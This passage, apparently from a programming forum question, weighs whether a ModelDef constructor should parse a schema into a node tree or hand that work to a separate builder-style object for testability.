node tree by parsing the schema requires a significant amount of complex code -- code that needs to be thoroughly tested. I don't want to relegate it to glue code (which should be relatively trivial, and will likely not be directly tested).I have thought of putting the code to create the node tree in a separate builder object, but hesitate to call it a builder, because it doesn't really match the Builder Pattern (which seem to be more concerned with eliminating telescoping constructors). But even if I called it something different (e.g. NodeTreeConstructor), it still feels like a bit of a hack just to avoid having the ModelDef constructor build the node tree. It has to be built somewhere; why not in the object that's going to own it?",
